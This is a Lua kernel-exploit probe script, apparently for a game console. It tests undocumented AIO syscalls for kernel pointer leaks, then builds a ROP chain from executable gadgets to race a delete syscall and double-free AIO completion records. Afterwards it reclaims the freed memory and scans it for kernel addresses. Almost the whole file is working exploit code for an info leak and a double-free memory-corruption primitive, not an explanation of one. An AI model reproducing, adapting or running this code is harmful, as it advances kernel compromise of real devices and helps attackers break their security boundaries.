-- CRASH_CLASS: MODERATE
-- PROBE 67a: Test AIO syscalls 663/666/667 with REAL AIO request IDs
--
-- These three syscalls are in the AIO range (661-670) and returned -1
-- for zero args. But they were NEVER tested with valid AIO request IDs.
-- If any of them is aio_return() or aio_error() equivalent, they might
-- copy raw completion record data (including kernel thread pointer at +8)
-- back to userland.
--
-- Also tests: after AIO double-free, do 663/666/667 return different
-- data from the corrupted completion records?

print("=== PROBE 67a: AIO readback via 663/666/667 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS + SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Open /dev/zero for AIO read targets
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one(sz)
    sz = sz or 16
    wq(N(reqs_b), uint64(1))            -- cmd=1 (read)
    wq(N(reqs_b) + 8, uint64(sz))       -- size
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0
end

-- =========================================================
-- [A] Submit, poll, then test 663/666/667 with valid IDs
-- =========================================================
print("")
print("[A] Test 663/666/667 with valid AIO IDs")

local test_ids = {}
for i = 1, 4 do
    local id = submit_one(64)
    if id ~= 0 then
        poll_one(id)
        table.insert(test_ids, id)
    end
end
print("  Submitted " .. #test_ids .. " requests, IDs: " ..
    table.concat(test_ids, ", "))

if #test_ids == 0 then print("  FAILED: no AIO IDs"); return end

-- Big output buffers with sentinel patterns
local out1 = memory.alloc(0x200)
local out2 = memory.alloc(0x200)
local out3 = memory.alloc(0x200)

for _, sc_num in ipairs({663, 666, 667}) do
    if not alive() then print("  DEAD before sc " .. sc_num); break end

    print(string.format("  --- Syscall %d ---", sc_num))

    for _, id in ipairs(test_ids) do
        if not alive() then break end

        -- Fill output buffers with sentinels
        for off = 0, 0x1FC, 4 do
            wd(N(out1) + off, 0xAAAAAAAA)
            wd(N(out2) + off, 0xBBBBBBBB)
            wd(N(out3) + off, 0xCCCCCCCC)
        end

        -- Try multiple arg layouts:
        -- Layout 1: (id, outbuf, size)
        local ok1, ret1 = pcall(function()
            return mk(sc_num)(uint64(id), uint64(N(out1)), uint64(0x100))
        end)
        local r1 = ok1 and sgn(ret1) or -999

        -- Layout 2: (id_array, count, status_array) — like 664
        wd(N(one_id), id)
        wd(N(one_st), 0xDEADDEAD)
        local ok2, ret2 = pcall(function()
            return mk(sc_num)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        local r2 = ok2 and sgn(ret2) or -999
        local st2 = rd(N(one_st)) or 0xDEADDEAD

        -- Layout 3: (id, outbuf, sizep) — pointer to size
        local szp = memory.alloc(8)
        wd(N(szp), 0x100)
        local ok3, ret3 = pcall(function()
            return mk(sc_num)(uint64(id), uint64(N(out2)), uint64(N(szp)))
        end)
        local r3 = ok3 and sgn(ret3) or -999

        -- Layout 4: just (id)
        local ok4, ret4 = pcall(function()
            return mk(sc_num)(uint64(id))
        end)
        local r4 = ok4 and sgn(ret4) or -999

        -- Layout 5: (outbuf, id, count) for a potential "get result by ID"
        local ok5, ret5 = pcall(function()
            return mk(sc_num)(uint64(N(out3)), uint64(id), uint64(1))
        end)
        local r5 = ok5 and sgn(ret5) or -999

        print(string.format("    id=%d: L1=%d L2=%d(st=%08X) L3=%d L4=%d L5=%d",
            id, r1, r2, st2, r3, r4, r5))

        -- Check if any output buffer was modified
        local function check_buf(buf, sentinel, label)
            local changed = 0
            local first_val = nil
            for off = 0, 0x7C, 4 do
                local v = rd(N(buf) + off)
                if v and v ~= sentinel then
                    changed = changed + 1
                    if not first_val then
                        first_val = string.format("+%02X=%08X", off, v)
                    end
                end
            end
            if changed > 0 then
                print(string.format("      %s: %d dwords changed, first: %s",
                    label, changed, first_val))
                -- Dump first 64 bytes if changed
                local hex = ""
                for off = 0, 60, 4 do
                    local v = rd(N(buf) + off) or 0
                    hex = hex .. string.format("%08X ", v)
                end
                print("      " .. hex)
                -- Check for kernel pointer pattern
                for off = 0, 0x7C, 8 do
                    local q = rq(N(buf) + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print(string.format("      *** KERNEL PTR at +%02X: %s ***",
                                off, fmt_q(q)))
                        end
                    end
                end
            end
        end

        check_buf(out1, 0xAAAAAAAA, "out1(L1)")
        check_buf(out2, 0xCCCCCCCC, "out2(L3)")  -- note: out2 used in L3
        check_buf(out3, 0xCCCCCCCC, "out3(L5)")

        -- Check if status (L2) contains interesting data
        if st2 ~= 0xDEADDEAD and st2 ~= 0 and st2 ~= 0x80020003 then
            print(string.format("      *** INTERESTING STATUS: 0x%08X ***", st2))
        end
    end
end

if not alive() then print("DEAD during section A"); return end

-- =========================================================
-- [B] Test 663 with un-polled (in-flight) requests
-- =========================================================
print("")
print("[B] Test 663/666/667 with UN-POLLED (in-flight) AIO IDs")

local inflight_ids = {}
for i = 1, 4 do
    local id = submit_one(64)
    if id ~= 0 then table.insert(inflight_ids, id) end
end
print("  In-flight IDs: " .. table.concat(inflight_ids, ", "))

for _, sc_num in ipairs({663, 666, 667}) do
    if not alive() then break end
    for _, id in ipairs(inflight_ids) do
        if not alive() then break end

        for off = 0, 0x7C, 4 do wd(N(out1) + off, 0xAAAAAAAA) end

        local ok, ret = pcall(function()
            return mk(sc_num)(uint64(id), uint64(N(out1)), uint64(0x100))
        end)
        local r = ok and sgn(ret) or -999

        -- Layout 2: like 664
        wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
        local ok2, ret2 = pcall(function()
            return mk(sc_num)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        local r2 = ok2 and sgn(ret2) or -999
        local st2 = rd(N(one_st)) or 0xDEADDEAD

        print(string.format("    sc%d id=%d: L1=%d L2=%d(st=%08X)",
            sc_num, id, r, r2, st2))

        -- Check output buffer
        local changed = 0
        for off = 0, 0x7C, 4 do
            local v = rd(N(out1) + off)
            if v and v ~= 0xAAAAAAAA then changed = changed + 1 end
        end
        if changed > 0 then
            print(string.format("      *** out1: %d dwords changed ***", changed))
            local hex = ""
            for off = 0, 60, 4 do hex = hex .. string.format("%08X ", rd(N(out1) + off) or 0) end
            print("      " .. hex)
        end
    end
end

-- Cleanup in-flight
for _, id in ipairs(inflight_ids) do
    poll_one(id)
    delete_one(id)
end

-- Cleanup polled
for _, id in ipairs(test_ids) do
    delete_one(id)
end

if not alive() then print("DEAD during cleanup"); return end

-- =========================================================
-- [C] After double-free: check if 663/666/667 leak stale data
-- =========================================================
print("")
print("[C] Double-free then check 663/666/667 for stale kernel data")

-- Eboot base for child thread ROP
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local VICTIMS = 16
local del_ids = memory.alloc(4 * VICTIMS + 0x10)
local stChild = memory.alloc(4 * VICTIMS + 0x10)
local stMain  = memory.alloc(4 * VICTIMS + 0x10)
local markerC = memory.alloc(8)

-- Submit + poll victims
local vids = {}
for i = 1, VICTIMS do
    local id = submit_one()
    if id ~= 0 then poll_one(id); table.insert(vids, id) end
end
local vc = #vids
print("  Victims: " .. vc)

if vc < 4 then print("  Too few victims"); return end

for i = 0, vc - 1 do
    wd(N(del_ids) + i * 4, vids[i + 1])
    wd(N(stChild) + i * 4, 0xCCCCCCCC)
    wd(N(stMain) + i * 4, 0xDDDDDDDD)
end
wq(N(markerC), uint64(0))

-- Child ROP for 662 race
local stk = memory.alloc(0x4000)
local sb = N(stk)
local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
local off = 0
local function em(v) wq(rsp + off, v); off = off + 8 end
em(g_pop_rax); em(uint64(0xCC))
em(g_pop_rdi); em(uint64(N(markerC)))
em(g_mov_m_rax)
em(g_pop_rdi); em(uint64(N(del_ids)))
em(g_pop_rsi); em(uint64(vc))
em(g_pop_rdx); em(uint64(N(stChild)))
em(g_pop_rax); em(uint64(662))
em(stub)
em(g_pop_rax); em(uint64(0xCD))
em(g_pop_rdi); em(uint64(N(markerC)))
em(g_mov_m_rax)
em(g_pop_rdi); em(uint64(0))
em(g_pop_rax); em(uint64(431))
em(stub)

local par = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
wq(N(par), g_bare_ret)
wq(N(par) + 0x10, uint64(sb))
wq(N(par) + 0x18, uint64(0x2000))
local tid_p = memory.alloc(8); wq(N(tid_p), uint64(0))
wq(N(par) + 0x30, tid_p)

-- Launch race
pcall(function() mk(455)(par, uint64(0x38)) end)
pcall(function()
    mk(662)(uint64(N(del_ids)), uint64(vc), uint64(N(stMain)))
end)

-- Wait for child
for w = 1, 50000 do local _ = rd(N(dbuf)) end

local doubles = 0
for i = 0, vc - 1 do
    local sM = rd(N(stMain) + i * 4) or 0xDDDDDDDD
    local sC = rd(N(stChild) + i * 4) or 0xCCCCCCCC
    if sM == 0 and sC == 0 then doubles = doubles + 1 end
end
print(string.format("  Race result: %d/%d doubles", doubles, vc))

if not alive() then print("  DEAD during race"); return end

-- Now submit NEW AIO requests — these allocations may reclaim
-- the double-freed zone-64 blocks
local new_ids = {}
for i = 1, 32 do
    local id = submit_one(64)
    if id ~= 0 then
        poll_one(id)
        table.insert(new_ids, id)
    end
end
print("  Post-race new requests: " .. #new_ids)

-- Test 663/666/667 on the new IDs
for _, sc_num in ipairs({663, 666, 667}) do
    if not alive() then break end
    print(string.format("  sc%d on new IDs:", sc_num))

    for j = 1, math.min(8, #new_ids) do
        local id = new_ids[j]
        if not alive() then break end

        -- Fill with sentinels
        for off2 = 0, 0xFC, 4 do wd(N(out1) + off2, 0xAAAAAAAA) end
        wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)

        -- Try both layouts
        local ok1, ret1 = pcall(function()
            return mk(sc_num)(uint64(id), uint64(N(out1)), uint64(0x100))
        end)

        local ok2, ret2 = pcall(function()
            return mk(sc_num)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)

        local r1 = ok1 and sgn(ret1) or -999
        local r2 = ok2 and sgn(ret2) or -999
        local st2 = rd(N(one_st)) or 0xDEADDEAD

        -- Check output for kernel pointers
        local kptrs = 0
        for off2 = 0, 0xF8, 8 do
            local q = rq(N(out1) + off2)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kptrs = kptrs + 1
                    if kptrs <= 3 then
                        print(string.format("    *** KPTR +%02X: %s ***", off2, fmt_q(q)))
                    end
                end
            end
        end

        local changed = 0
        for off2 = 0, 0xFC, 4 do
            local v = rd(N(out1) + off2)
            if v and v ~= 0xAAAAAAAA then changed = changed + 1 end
        end

        if changed > 0 or kptrs > 0 or (st2 ~= 0xDEADDEAD and st2 ~= 0) then
            print(string.format("    id=%d L1=%d L2=%d st=%08X changed=%d kptrs=%d",
                id, r1, r2, st2, changed, kptrs))
        end
    end
end

-- Cleanup
for _, id in ipairs(new_ids) do delete_one(id) end

print("")
print("=== PROBE 67a COMPLETE ===")
